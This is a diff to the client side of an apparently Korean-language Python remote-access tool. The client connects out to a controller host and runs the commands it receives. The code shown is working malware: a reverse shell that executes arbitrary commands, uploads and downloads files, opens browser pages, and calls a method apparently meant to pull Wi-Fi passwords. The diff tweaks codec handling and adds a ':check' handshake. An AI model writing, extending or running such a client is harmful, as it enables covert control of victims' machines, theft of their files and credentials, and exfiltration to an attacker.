@@ -1,5 +1,5 @@
 import socket
-import os
+import os, sys
 import subprocess
 import webbrowser as browser
 from sendrecv import SendRecv
@@ -11,7 +11,7 @@ class Client:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.settimeout(3600)
         self.controller = SendRecv(self.sock)
-        self.decode = "utf-8"
+        self.codec = "utf-8"
 
         self.sock.connect((host, port))
         self.shell()
@@ -23,8 +23,8 @@ class Client:
 
         while True:
             command = self.controller.recv()
-            if command.strip():
-                command = command.decode(self.decode).strip()
+            command = command.decode(self.codec).strip()
+            if command:
                 if ":download" in command:
                     self.upload(command)
                 elif ":upload" in command:
@@ -34,16 +34,16 @@ class Client:
                     self.sock.close()
                     break
                 elif command == ":codec":
-                    self.decode = self.get_codec()
+                    self.codec = self.get_codec()
                 elif ":browse" in command:
                     self.browse(command)
                 elif command == ":wifi":
                     self.wifiPW()
                 elif "cd" in command:
                     dirc = "".join(command.split("cd")).strip()
-                    if not dirc.strip() : pass # controler.send("{}\n".format(os.getcwd()).encode(self.decode))
+                    if not dirc.strip() : pass # controler.send("{}\n".format(os.getcwd()).encode(self.codec))
                     elif dirc == "-": 
-                        if not prevDirs: self.controller.send("error: cd: 이전 경로가 없습니다! \n".encode(self.decode))
+                        if not prevDirs: self.controller.send("error: cd: 이전 경로가 없습니다! \n".encode(self.codec))
                         else:
                             tmpdir = prevDirs.pop()
                             os.chdir(tmpdir)
@@ -51,13 +51,16 @@ class Client:
                     elif dirc =="--":
                         prevDirs.append(os.getcwd())
                         os.chdir(mainDir)
-                        # controler.send(f"메인 디렉토리로 돌아갑니다[ {mainDir}/ ]\n".encode(self.decode))
+                        # controler.send(f"메인 디렉토리로 돌아갑니다[ {mainDir}/ ]\n".encode(self.codec))
                     else:
-                        if not os.path.isdir(dirc): self.controller.send(f"error: cd: '{dirc}': 해당 파일이나 폴더를 찾을수 없습니다!\n".encode(self.decode))
+                        if not os.path.isdir(dirc): self.controller.send(f"error: cd: '{dirc}': 해당 파일이나 폴더를 찾을수 없습니다!\n".encode(self.codec))
                         else:
                             prevDirs.append(os.getcwd())
                             os.chdir(dirc)
-                    self.sock.send(str.encode(os.getcwd() + "> "))
+                    self.controller.send(str.encode(os.getcwd() + "> "))
+                elif command == ":check":
+                    self.controller.send(b":Done:")
+
                 else:
                     output_str = self.runCMD(command)
                     self.controller.send(bytes(output_str))
@@ -96,12 +99,12 @@ class Client:
                     os.remove(filename)
                     return
                 wf.write(data)
-        self.controller.send(str(os.getcwd()+os.sep+filetodown).encode(self.decode))
+        self.controller.send(str(os.getcwd()+os.sep+filetodown).encode(self.codec))
 
     def upload(self, command):
         """ 요구하는 파일을 업로드 한다 """
         filetosend = "".join(command.split(":download")).strip()
-        if not os.path.isfile(filetosend): self.controller.send(f"error: '{filetosend}': 해당 파일을 찾을수 없습니다 !".encode(self.decode))
+        if not os.path.isfile(filetosend): self.controller.send(f"error: '{filetosend}': 해당 파일을 찾을수 없습니다 !".encode(self.codec))
         else:
             self.controller.send(b":True:")
             with open(filetosend, "rb") as rf:
@@ -123,9 +126,18 @@ class Client:
 
     def get_codec(self):
         """ 해당 터미널 환경의 코텍을 확인&전송 """
-        decode = os.device_encoding(0)
-        self.controller.send(str(decode).encode("utf-8"))
-        return decode
+        try:
+            cmd = subprocess.Popen("chcp",
+                                   shell=True,
+                                   stdout=subprocess.PIPE,
+                                   stdin=subprocess.PIPE,
+                                   stderr=subprocess.PIPE)
+            output = cmd.stdout.read() + cmd.stderr.read()
+            codec = output.split(b":")[-1].strip().decode("utf-8")
+        except:
+            codec = "utf-8"
+        self.controller.send(str(codec).encode("utf-8"))
+        return codec
         
 
 try:
